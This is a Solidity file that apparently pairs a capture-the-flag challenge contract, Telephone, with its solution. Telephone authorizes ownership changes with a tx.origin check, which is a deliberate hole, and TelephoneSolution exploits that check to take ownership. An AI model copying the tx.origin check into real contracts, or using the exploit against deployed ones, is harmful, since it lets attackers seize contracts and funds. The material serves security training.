// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneSolution {
    constructor(address _challengeAddress) public {
        Telephone challenge = Telephone(_challengeAddress);
        challenge.changeOwner(msg.sender);

        require(challenge.owner() == msg.sender, "Wrong owner");
    }
}